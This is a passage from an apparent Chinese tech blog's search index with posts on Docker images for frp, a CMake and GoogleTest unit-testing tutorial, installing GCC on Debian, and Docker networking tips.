&amp;&amp; npm config set registry https://registry.npm.taobao.org \\ &amp;&amp; npm install \\ &amp;&amp; npm run build# 拷贝APP项目编译后的文件RUN mkdir -p $APP_HOME \\ &amp;&amp; rm -rf $APP_HOME/* \\ &amp;&amp; cp -R -rf /tmp/markdown-weixin/docs/* $APP_HOME# 清理文件RUN rm -rf /usr/local/src &amp;&amp; rm -rf /tmp/markdown-weixin# 设置默认工作目录WORKDIR $APP_HOME# 暴露端口EXPOSE 80EXPOSE 443CMD $TENGINE_HOME/sbin/nginx -g \'daemon off;\' -c $TENGINE_HOME/conf/nginx.conf var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客 前端"},{title:"Docker 构建 Frp 镜像",url:"/posts/8285186a.html",text:'前言 Frp 官方文档 Frp GitHub 项目 Frp Docker GitHub 项目 构建 Frps 镜像 Dockerfile 编写 123456789101112131415161718FROM amd64/alpine:3.10LABEL maintainer="snowdream &lt;sn0wdr1am@icloud.com&gt;"ENV FRP_VERSION 0.38.0RUN cd /root \\ &amp;&amp; wget --no-check-certificate -c https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; tar zxvf frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; cd frp_${FRP_VERSION}_linux_amd64/ \\ &amp;&amp; cp frps /usr/bin/ \\ &amp;&amp; mkdir -p /etc/frp \\ &amp;&amp; cp frps.ini /etc/frp \\ &amp;&amp; cd /root \\ &amp;&amp; rm frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; rm -rf frp_${FRP_VERSION}_linux_amd64/ ENTRYPOINT /usr/bin/frps -c /etc/frp/frps.ini 构建镜像 1# docker build -f Dockerfile -t clay/frps:0.38.0 . 启动镜像 1# docker run --restart=always --network host -d -v /etc/frp/frps.ini:/etc/frp/frps.ini --name frps clay/frps 查看日志信息 1# docker logs -f --tail 20 frps 构建 Frpc 镜像 Dockerfile 编写 123456789101112131415161718FROM amd64/alpine:3.10LABEL maintainer="snowdream &lt;sn0wdr1am@icloud.com&gt;"ENV FRP_VERSION 0.38.0RUN cd /root \\ &amp;&amp; wget --no-check-certificate -c https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; tar zxvf frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; cd frp_${FRP_VERSION}_linux_amd64/ \\ &amp;&amp; cp frpc /usr/bin/ \\ &amp;&amp; mkdir -p /etc/frp \\ &amp;&amp; cp frpc.ini /etc/frp \\ &amp;&amp; cd /root \\ &amp;&amp; rm frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; rm -rf frp_${FRP_VERSION}_linux_amd64/ ENTRYPOINT /usr/bin/frpc -c /etc/frp/frpc.ini 构建镜像 1# docker build -f Dockerfile -t clay/frpc:0.38.0 . 启动镜像 1# docker run --restart=always --network host -d -v /etc/frp/frpc.ini:/etc/frp/frpc.ini --name frpc clay/frpc 查看日志信息 1# docker logs -f --tail 20 frpc var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"CMake 入门教程之三单元测试",url:"/posts/52f22f9b.html",text:'前言CMake 是一个跨平台的 C/C++ 项目组织管理工具，虽然许多 IDE 都有私有的项目管理工具，但是在现在各大 IDE 基本都支持使用 CMake 管理项目，所以如果有跨平台的需求，使用 CMake 管理是最方便的。值得一提的是，CMake 支持 gtest、cppunit 等单元测试框架，当然也可以使用断言自定义单元测试。 创建简单的带单元测试的项目创建项目工程下载代码 点击下载 完整的案例代码，项目的目录结构如下： 12345678910111213minder-test├── CMakeLists.txt├── include│ └── datetime.h├── src│ ├── datetime.cpp│ └── main.cpp└── test ├── CMakeLists.txt ├── include │ └── strUtil.h └── src └── main.cpp 编写项目代码 include/datetime.h 1234567891011121314151617181920#pragma once#include &lt;iostream&gt;#include &lt;sstream&gt;using namespace std;// 日期工具类class DateUtil {public: static string formatCurrentTime(); static string formatCurrentTime(string format); static int dayOfWeek(const string &amp;date); static bool isWeekendDays(const string &amp;date);}; src/datetime.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include "datetime.h"// 格式化当前时间// 默认格式是: 2020-06-07 23:46:53string DateUtil::formatCurrentTime() { time_t rawtime; struct tm *info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", info); string str(buffer); return str;}// 格式化当前时间// format: 格式字符串，例如 %Y-%m-%d %H:%M:%Sstring DateUtil::formatCurrentTime(string format) { time_t rawtime; struct tm *info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, format.c_str(), info); string str(buffer); return str;}// 根据给定的日期，计算它是星期几// date: 日期字符串，格式是: 2021-12-01// 返回值：1, 2, 3, 4, 5, 6, 0, 其中 0 表示星期日int DateUtil::dayOfWeek(const string &amp;date) { char c; int y, m, d; stringstream(date) &gt;&gt; y &gt;&gt; c &gt;&gt; m &gt;&gt; c &gt;&gt; d; tm t = {0, 0, 0, d, m - 1, y - 1900}; mktime(&amp;t); return t.tm_wday;}// 根据给定的日期，判断是否为周末// date: 日期字符串，格式是: 2021-12-01bool DateUtil::isWeekendDays(const string &amp;date) { int wday = dayOfWeek(date); if (wday == 6 || wday == 0) { return true; } return false;} src/main.cpp 12345678910#include &lt;iostream&gt;#include "datetime.h"using namespace std;int main() { cout &lt;&lt; DateUtil::formatCurrentTime() &lt;&lt; endl; cout &lt;&lt; DateUtil::formatCurrentTime("%Y-%m-%d") &lt;&lt; endl; return 0;} test/include/strUtil.h 1234567891011121314#pragma once#include &lt;iostream&gt;using namespace std;// 去除字符串两边的空格void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);} test/src/main.cpp 1234567891011121314151617#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"using namespace std;int main() { // 去除字符串两边的空格 string str = " Hello World ! "; trim(str); cout &lt;&lt; str &lt;&lt; endl; // 根据给定的日期，计算它是星期几 cout &lt;&lt; "wday = " &lt;&lt; DateUtil::dayOfWeek("2022-01-11") &lt;&lt; ", "; cout &lt;&lt; "isWeekendDays = " &lt;&lt; (DateUtil::isWeekendDays("2022-01-11") ? "true" : "false") &lt;&lt; endl; return 0;} 其中 test 目录可以视作为子项目，和主目录分开编译。为了模拟更真实的企业项目开发场景，这里的 test/src/main.cpp 同时引入了 datetime.h 和 strUtil.h 头文件。 CMake 配置文件 主目录的 CMakeLists.txt 12345678910111213141516171819202122232425262728293031323334cmake_minimum_required(VERSION 3.15)# 项目信息project(minder)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 输出调试信息set(CMAKE_CXX_FLAGS "-g")# 开启所有警告set(CMAKE_CXX_FLAGS "-Wall")# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 引入主项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索主项目的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src MAIN_SOURCES)# 指定可执行文件的名称和主项目的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES})# 启用项目测试enable_testing()# 添加子目录（测试项目）add_subdirectory(test)# 添加测试项目的可执行文件add_test(minder_test ${PROJECT_SOURCE_DIR}/test/build/minder_test) 特别说明： set(CMAKE_CXX_FLAGS "-xxx")：指定编译参数，细化的还有 CMAKE_CXX_FLAGS_DEBUG 和 CMAKE_CXX_FLAGS_RELEASE add_subdirectory(xxx)：添加子目录（子项目），要求子目录里必须有单独的 CMakeLists.txt，该文件包含了子目录的编译配置信息 add_test(xxx ${PROJECT_SOURCE_DIR}/test/build/xxx)：第一个参数是某个单元测试的名称，第二个参数是该单元测试的可执行文件的路径 test 目录的 CMakeLists.txt 12345678910111213141516171819202122232425262728cmake_minimum_required(VERSION 3.15)# 项目信息project(minder_test)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 搜索父目录（父项目）的头文件include_directories(../include)# 搜索父目录（父项目）的源文件aux_source_directory(../src MAIN_SOURCES)# 排除父目录（父项目）的入口源文件list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# 引入子项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索子项目里的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 指定可执行文件的名称和单元测试的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES}) 这里的 test 作为子项目，主要要生成单元测试的可执行文件。 命令行编译项目 编译 test 子项目 1234567891011121314151617# 进入子项目的目录$ cd minder-test/test# 创建子项目的构建目录$ mkdir build# 进入子项目的构建目录$ cd build# 构建子项目$ cmake ..# 编译子项目$ make# 运行可执行文件$ ./minder_test 编译主项目 1234567891011121314151617181920# 进入主项目的目录$ cd minder-test# 创建主项目的构建目录$ mkdir build# 进入主项目的构建目录$ cd build# 构建主项目$ cmake ..# 编译主项目$ make# 执行项目测试$ make test# 运行可执行文件$ ./minder CMake 使用 GoogleTest 测试框架相关站点 GoogleTest 官方文档 GoogleTest GitHub 仓库 GoogleTest 官方下载页面 GoogleTest 的安装GoogleTest 编译安装注意事项 GoogleTest 最新版（1.11.0）要求使用 GCC 5.0+ 和 Clang 5.0+，若 GCC 的版本比较低，建议安装 GoogleTest 1.10.0 或者 1.8.1 版本 实测 GCC 4.8.5 可以正常使用 GoogleTest 的 1.10.0 版本，不兼容 1.11.0 版本 1234567891011121314151617181920212223# 下载文件$ wget https://github.com/google/googletest/archive/refs/tags/release-1.11.0.tar.gz# 解压文件$ tar -xvf release-1.11.0.tar.gz# 进入解压目录$ cd googletest-release-1.11.0# 创建构建目录$ mkdir build# 进入构建目录$ cd build# 生成makefile，如果需要构建得到动态链接库，则必须添加参数 "-DBUILD_SHARED_LIBS=ON"，否则默认只会得到静态库（.a）$ cmake -DBUILD_SHARED_LIBS=ON -Dgtest_build_samples=ON ..# 编译$ make -j4# 安装$ make install 值得一提的是，安装命令执行完成后，会自动将 libgmock_main.so 、libgmock.so、libgtest_main.so、libgtest.so 库文件拷贝到 /usr/local/lib64/ 目录下。GoogleTest 的头文件则会安装在 /usr/local/include/gmock 和 /usr/local/include/gtest/ 目录。 GoogleTest 验证安装 创建 C++ 源文件 test.cpp 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;gtest/gtest.h&gt;TEST( COutputPopLimitStrategyTest, PositiveNos ){ EXPECT_EQ(true, true);}int main( int argc, char *argv[] ){ ::testing::InitGoogleTest( &amp;argc, argv ); return(RUN_ALL_TESTS() );} 使用 G++ 命令编译 C++ 源文件 12345678910111213141516# 编译源文件$ g++ -std=c++11 test.cpp -lpthread /usr/local/lib64/libgtest.so -o test# 运行可执行文件，若输出以下的日志信息，则说明GoogleTest安装成功$ ./test[==========] Running 1 test from 1 test suite.[----------] Global test environment set-up.[----------] 1 test from COutputPopLimitStrategyTest[ RUN ] COutputPopLimitStrategyTest.PositiveNos[ OK ] COutputPopLimitStrategyTest.PositiveNos (0 ms)[----------] 1 test from COutputPopLimitStrategyTest (1 ms total)[----------] Global test environment tear-down[==========] 1 test from 1 test suite ran. (1 ms total)[ PASSED ] 1 test. G++ 编译参数说明： -std=c++11：指定 C++ 的版本 /usr/local/lib64/libgtest.so：链接 GoogleTest 的动态链接库 -lpthread：由于 GoogleTest 的内部使用了多线程，因此需要链接 pthread 库 Google Test 的使用案例创建项目工程下载代码 点击下载 完整的案例代码，项目的目录结构如下： 12345678910111213minder-gtest├── CMakeLists.txt├── include│ └── datetime.h├── src│ ├── datetime.cpp│ └── main.cpp└── test ├── CMakeLists.txt ├── include │ └── strUtil.h └── src └── main.cpp 编写项目代码下载代码 这里的 C++ 代码，除了 main.cpp 的代码不一样之外，其他代码与上面的案例代码完全一致，不再累述。 1234567891011121314151617181920212223#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"#include &lt;gtest/gtest.h&gt;using namespace std;// 去除字符串两边的空格TEST(TestCase, test1) { string str = " Hello World ! "; trim(str); ASSERT_EQ("Hello World !", str);}// 根据给定的日期，计算它是星期几TEST(TestCase, test2) { ASSERT_EQ(true, DateUtil::isWeekendDays("2022-01-09"));}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} CMake 配置文件 主目录的 CMakeLists.txt，这里的配置内容与上面的案例没有任何区别 12345678910111213141516171819202122232425262728293031323334cmake_minimum_required(VERSION 3.15)# 项目信息project(minder)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 输出调试信息set(CMAKE_CXX_FLAGS "-g")# 开启所有警告set(CMAKE_CXX_FLAGS "-Wall")# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 引入主项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索主项目的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src MAIN_SOURCES)# 指定可执行文件的名称和主项目的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES})# 启用单元测试enable_testing()# 添加子目录（子项目）add_subdirectory(test)# 添加单元测试的可执行文件add_test(minder_test ${PROJECT_SOURCE_DIR}/test/build/minder_test) test 目录的 CMakeLists.txt，这里的配置内容新增了 GoogleTest 库 1234567891011121314151617181920212223242526272829303132333435363738394041cmake_minimum_required(VERSION 3.15)# 项目信息project(minder_test)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 查找 GoogleTest 库find_package(GTest REQUIRED)# 显示 GoogleTest 库的路径MESSAGE(STATUS "GTEST_INCLUDE_DIRS : " ${GTEST_INCLUDE_DIRS})MESSAGE(STATUS "GTEST_BOTH_LIBRARIES : " ${GTEST_BOTH_LIBRARIES})# 搜索父目录（父项目）的头文件include_directories(../include)# 搜索父目录（父项目）的源文件aux_source_directory(../src MAIN_SOURCES)# 排除父目录（父项目）的入口源文件list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# 引入子项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索子项目里的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# 引入 GoogleTest 的头文件include_directories(${GTEST_INCLUDE_DIRS})# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 指定可执行文件的名称和单元测试的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES})# 链接 GoogleTest 与 pthread 库（请特别注意声明的顺序）target_link_libraries(${PROJECT_NAME} ${GTEST_BOTH_LIBRARIES} pthread) 命令行编译项目 编译 test 子项目 1234567891011121314151617# 进入子项目的目录$ cd minder-gtest/test# 创建子项目的构建目录$ mkdir build# 进入子项目的构建目录$ cd build# 构建子项目$ cmake ..# 编译子项目$ make# 运行可执行文件$ ./minder_test 运行可执行文件后，输出的日志信息如下： 123456789101112[==========] Running 2 tests from 1 test suite.[----------] Global test environment set-up.[----------] 2 tests from TestCase[ RUN ] TestCase.test1[ OK ] TestCase.test1 (0 ms)[ RUN ] TestCase.test2[ OK ] TestCase.test2 (0 ms)[----------] 2 tests from TestCase (0 ms total)[----------] Global test environment tear-down[==========] 2 tests from 1 test suite ran. (2 ms total)[ PASSED ] 2 tests. 编译主项目 1234567891011121314151617181920# 进入主项目的目录$ cd minder-gtest# 创建主项目的构建目录$ mkdir build# 进入主项目的构建目录$ cd build# 构建主项目$ cmake ..# 编译主项目$ make# 执行项目测试$ make test# 运行可执行文件$ ./minder GoogleTest 使用扩展说明在上面的案例中，GoogleTest 是使用源码编译的方式安装到 Linux 系统上的，这在迁移操作系统的时候，需要重复执行同样的安装步骤。此时为了方便日后迁移操作系统，可以将 GoogleTest 的头文件、动态链接都复制一份到项目中，这样就可以不依赖外部的系统环境了。 提示 点击下载 完整的案例代码，项目的目录结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778minder-gtest-plus├── CMakeLists.txt├── include│ └── datetime.h├── src│ ├── datetime.cpp│ └── main.cpp├── test│ ├── CMakeLists.txt│ ├── include│ │ └── strUtil.h│ └── src│ └── main.cpp└── thirdparty └── googletest ├── gmock │ ├── include │ │ └── gmock │ │ ├── gmock-actions.h │ │ ├── gmock-cardinalities.h │ │ ├── gmock-function-mocker.h │ │ ├── gmock-generated-actions.h │ │ ├── gmock-generated-actions.h.pump │ │ ├── gmock-generated-function-mockers.h │ │ ├── gmock-generated-function-mockers.h.pump │ │ ├── gmock-generated-matchers.h │ │ ├── gmock-generated-matchers.h.pump │ │ ├── gmock.h │ │ ├── gmock-matchers.h │ │ ├── gmock-more-actions.h │ │ ├── gmock-more-matchers.h │ │ ├── gmock-nice-strict.h │ │ ├── gmock-spec-builders.h │ │ └── internal │ │ ├── custom │ │ │ ├── gmock-generated-actions.h │ │ │ ├── gmock-generated-actions.h.pump │ │ │ ├── gmock-matchers.h │ │ │ ├── gmock-port.h │ │ │ └── README.md │ │ ├── gmock-internal-utils.h │ │ ├── gmock-port.h │ │ └── gmock-pp.h │ └── lib │ ├── libgmock_main.so │ └── libgmock.so └── gtest ├── include │ └── gtest │ ├── gtest-death-test.h │ ├── gtest.h │ ├── gtest-matchers.h │ ├── gtest-message.h │ ├── gtest-param-test.h │ ├── gtest_pred_impl.h │ ├── gtest-printers.h │ ├── gtest_prod.h │ ├── gtest-spi.h │ ├── gtest-test-part.h │ ├── gtest-typed-test.h │ └── internal │ ├── custom │ │ ├── gtest.h │ │ ├── gtest-port.h │ │ ├── gtest-printers.h │ │ └── README.md │ ├── gtest-death-test-internal.h │ ├── gtest-filepath.h │ ├── gtest-internal.h │ ├── gtest-param-util.h │ ├── gtest-port-arch.h │ ├── gtest-port.h │ ├── gtest-string.h │ ├── gtest-type-util.h │ └── gtest-type-util.h.pump └── lib ├── libgtest_main.so └── libgtest.so test 目录的 CMakeLists.txt，这里的配置内容使用了项目里的 GoogleTest 库 1234567891011121314151617181920212223242526272829303132333435363738394041cmake_minimum_required(VERSION 3.15)# 定义 GoogleTest 库的目录路径set(PATH_TO_GOOGLE_TEST ../thirdparty/googletest/gtest)set(PATH_TO_GOOGLE_MOCK ../thirdparty/googletest/gmock)# 项目信息project(minder_test)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 搜索父目录（父项目）的头文件include_directories(../include)# 搜索父目录（父项目）的源文件aux_source_directory(../src MAIN_SOURCES)# 排除父目录（父项目）的入口源文件list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# 引入子项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索子项目里的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# 引入 GoogleTest 库的头文件include_directories(${PATH_TO_GOOGLE_TEST}/include ${PATH_TO_GOOGLE_MOCK}/include)# 指定 GoogleTest 动态链接库所在的目录link_directories(${PATH_TO_GOOGLE_TEST}/lib ${PATH_TO_GOOGLE_MOCK}/lib)# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 指定可执行文件的名称和单元测试的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES})# 链接 GoogleTest 与 pthread 库（请特别注意声明的顺序）target_link_libraries(${PROJECT_NAME} gtest_main.so gtest.so gmock_main.so gmock.so pthread) main.cpp 的 C++ 代码，与上面的案例代码完全一致 1234567891011121314151617181920212223#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"#include &lt;gtest/gtest.h&gt;using namespace std;// 去除字符串两边的空格TEST(TestCase, test1) { string str = " Hello World ! "; trim(str); ASSERT_EQ("Hello World !", str);}// 根据给定的日期，计算它是星期几TEST(TestCase, test2) { ASSERT_EQ(true, DateUtil::isWeekendDays("2022-01-09"));}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} 参考博客 建立简单的带单元测试的 CMake 项目 CMake + GoogleTest 之一入门 CMake 使用 GoogleTest 进行单元测试 Centos7 C++ 安装使用 GoogleTest 进行单元测试 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ c语言 linux系统编程"},{title:"Debian 安装 GCC、G++、GDB",url:"/posts/7df04100.html",text:'提示 GCC 4.8.1，这是该编译器由 C 语言实现转向 C++ 实现（4.8 版本）后的首次升级，也是第一个实现 C++ 11 所有语言特性的编译器。 Debian 8 Jessie 更改仓库源 123456# 备份配置文件# cp /etc/apt/sources.list /etc/apt/sources.list.bak# 更改仓库源# echo "deb http://ftp.us.debian.org/debian/ jessie main contrib non-free" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://ftp.us.debian.org/debian/ jessie main contrib non-free" &gt;&gt; /etc/apt/sources.list 安装 GCC、G++、GDB 123456# 安装软件（最后得到的版本是4.8.4）# apt-get install -y gcc-4.8 g++-4.8 gdb# 建立软链接（可选）# ln -s /usr/bin/gcc-4.8 /usr/bin/gcc# ln -s /usr/bin/g++-4.8 /usr/bin/g++ Debian 9 Stretch提示 build-essential 指的是编译程序必需的软件包，包含了 GCC、G++、Make 等工具 在 Debian 9 Stretch 上安装 build-essential 后，得到的 GCC、G++ 的版本是 6.3.0 若希望在 Debian 9 Stretch 上安装低版本的 GCC/G++（例如 4.8），那么可以将上面 Debian 8 Jessie 的仓库源地址添加到 Debian 9 Stretch 系统里，然后使用同样的方法分别单独安装 GCC/G++ 更改仓库源 123456789101112# 备份配置文件# cp /etc/apt/sources.list /etc/apt/sources.list.bak# 更改仓库源# echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.list 安装 GCC、G++、GDB 1# apt-get install -y build-essential gdb 参考博客 Debian 9 安装 gcc-4.8 如何在 Debian Stretch 上安装 gcc-4.8 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"debian"},{title:"Docker 开发随笔",url:"/posts/abd1f0ff.html",text:'Docker 删除所有 none 镜像1# docker rmi `docker images | grep \'&lt;none&gt;\' | awk \'{print $3}\'` Docker 构建镜像时忽略错误信息根据 Dockerfile 构建镜像，当构建失败时，往往会出现以下错误： 12automake: error: no \'Makefile.am\' found for any configure outputError build: The command [/bin/sh -c aclocal &amp;&amp; autoconf &amp;&amp; automake -a] returned a non-zero code: 1 在很多企业的应用场景里，上面的错误信息实际上是无害的，可以忽略不处理。但一旦出现此类错误 Docker 就会停止构建，此时如果需要让 Docker 忽略类似的错误信息，可以使用 exit 0 1RUN make 当 Dockerfile 里包含了上面类似的指令，则可以改写为以下的内容，这将始终返回 0（成功）退出代码，此时 Docker 不会意外终止构建过程 1RUN make; exit 0 不同网段之间的容器实现互相通信Docker 命令行的使用提示 假设存在两个容器，分别是 Redis 容器（172.89.0.2）和 Nginx 容器（172.89.0.5），两者具体的 docker-compose.yml 配置信息如下： Redis 容器 123456789101112131415161718192021222324252627version: \'3.5\'services: redis: image: redis:5.0.4-stretch container_name: redis restart: always privileged: false environment: TZ: \'Asia/Shanghai\' ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - \'/usr/local/redis/data:/data\' - \'/usr/local/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.confnetworks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Nginx 容器 1234567891011121314151617181920212223242526version: \'3.5\'services: nginx: image: nginx:1.20 container_name: nginx restart: always privileged: false environment: TZ: \'Asia/Shanghai\' networks: nginx-network: ipv4_address: 172.64.0.5 ports: - 80:80 - 443:443 volumes: - \'/usr/local/nginx/conf/nginx.conf:/usr/local/nginx/conf/nginx.conf\'networks: nginx-network: name: nginx-network driver: bridge ipam: config: - subnet: 172.64.0.0/24 上述的 Redis 和 Nginx 容器分别处于不同的网段中，两者之间的网络无法直接 Ping 得通；若希望在 Redis 内可以 Ping 通 Nginx 容器，那么可以将 Nginx 容器添加到 Redis 容器所在网络里，命令示例如下： 12345678# 将Nginx容器添加到Redis容器所在网络里# docker network connect redis-network nginx# 查看Nginx容器在Redis容器所在网络里的IP# docker network inspect redis-network# 在Redis容器内直接Ping通Nginx容器（这里的IP是Nginx容器在新网络里的IP地址）# ping 172.89.0.3 警告 使用 docker network connect redis-network nginx 命令，将 Nginx 容器添加到 Redis 容器所在网络后，Nginx 在新网络里的 IP 地址是不固定的，例如 Docker 服务重启后 IP 地址会变更，这一点必须注意！ 将 Nginx 容器从 Redis 容器所在网络里移除掉，可以使用以下命令： 1# docker network disconnect redis-network nginx 提示 Docker 默认网络的名称是 bridge，默认情况下创建的所有容器都会在 bridge 网络内。 12345# 查看Docker的所有网络# docker network ls# 查看某网络下所有容器的信息（包括各个容器的IP）# docker network inspect redis-network Docker-Compose 的使用在 Docker-Compose 中，支持将 Nginx 容器添加到 Redis 容器所在网络里，配置示例如下所示。 提示 值得一提的是，这里通过 docker-compose.yml 配置文件，将 Nginx 容器添加到 Redis 容器所在网络后，Nginx 在新网络里的 IP 地址是固定的。 Redis 容器，配置内容和上面的案例一致 123456789101112131415161718192021222324252627version: \'3.5\'services: redis: image: redis:5.0.4-stretch container_name: redis restart: always privileged: false environment: TZ: \'Asia/Shanghai\' ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - \'/usr/local/redis/data:/data\' - \'/usr/local/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.confnetworks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Nginx 容器，配置了多个网络，同时指定了容器在不同网络下的 IP 地址 12345678910111213141516171819202122232425262728293031323334version: \'3.5\'services: nginx: image: nginx:1.20 container_name: nginx restart: always privileged: false environment: TZ: \'Asia/Shanghai\' networks: nginx-network: ipv4_address: 172.64.0.5 redis-network: ipv4_address: 172.89.0.3 ports: - 80:80 - 443:443 volumes: - \'/usr/local/nginx/conf/nginx.conf:/usr/local/nginx/conf/nginx.conf\'networks: nginx-network: name: nginx-network driver: bridge ipam: config: - subnet: 172.64.0.0/24 redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 查看 Docker 的网络状况 12345# 查看Nginx容器在Redis容器所在网络里的IP# docker network inspect redis-network# 在Redis容器内直接Ping通Nginx容器# ping 172.89.0.3 Docker 